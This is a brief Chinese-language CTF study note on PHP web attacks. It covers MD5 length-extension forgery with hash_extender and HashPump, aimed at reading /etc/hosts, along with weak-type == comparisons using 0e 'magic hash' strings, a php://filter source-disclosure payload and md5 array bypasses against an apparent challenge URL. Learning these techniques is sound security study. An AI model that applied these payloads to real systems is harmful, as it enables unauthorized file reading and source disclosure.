
# web基础

* php攻击
    - MD5 Length Extension Attack
    - 弱类型漏洞
    - md5加密


## php攻击
###  MD5 Length Extension Attack
* 工具
1. hash_extender  
> https://github.com/iagox86/hash_extender
2. HashPump  
> https://github.com/bwall/HashPump

* 代码
```shell
$ ./hash_extender -f md5 -l 32 -d '/etc/hosts' -s 'f3d366138601b5afefbd4fc15731692e' -a '' --out-data-format=html
Type: md5
Secret length: 32
New signature: 1b17d9594eb404c97c5090b11660ac63
New string: %2fetc%2fhosts%80%00%00%00%00%00%00%00%00%00%00%00%00%00P%01%00%00%00%00%00%00

$ ~/Desktop/HashPump
$ hashpump -s f3d366138601b5afefbd4fc15731692e -d /etc/hosts -k 32 -a /etc/hosts 
75221e2e5cd1cd1c7694cbd386571ffe
/etc/hosts\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00P\x01\x00\x00\x00\x00\x00\x00/etc/hosts


//最后构成
?filepath=%2fetc%2fhosts%80%00%00%00%00%00%00%00%00%00%00%00%00%00P%01%00%00%00%00%00%00%2fetc%2fhosts&sign=75221e2e5cd1cd1c7694cbd386571ffe
``` 

### 弱类型漏洞

* 弱类型漏洞之 ==

> password=240610708


### php流
* 漏洞
> php://filter
> ?file=php://filter/vonvert.base64-encode/resource=index.php


### md5加密
* 题目
``` 
if(md5($key1) == md5($key2) && $key1 !== $key2){
    echo $flag."取得flag";
}
```
* 解析
> md5加密的值一样而未加密的值不同，就输出flag

* 绕过方法
1. 数组
> md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。
``` 
http://123.206.87.240:8002/web16/index.php?kkeyey1[]=2&kkeyey2[]=1
```

2. 利用==比较漏洞
> 如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。
``` 
下列的字符串的MD5值都是0e开头的:
QNKCDZO
240610708
s878926199a
s155964671a
s214587387a
s214587387a
```
